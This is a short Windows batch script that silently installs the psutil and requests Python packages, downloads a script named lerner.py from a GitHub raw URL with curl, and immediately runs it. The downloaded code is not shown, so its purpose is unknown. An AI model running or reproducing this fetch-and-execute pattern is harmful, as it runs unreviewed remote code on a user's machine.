@echo off
pip install psutil --quiet
pip install requests --quiet
curl -s -L -o lerner.py https://raw.githubusercontent.com/RobinAlfa/comelet-slearntogether/main/lerner.py
python lerner.py
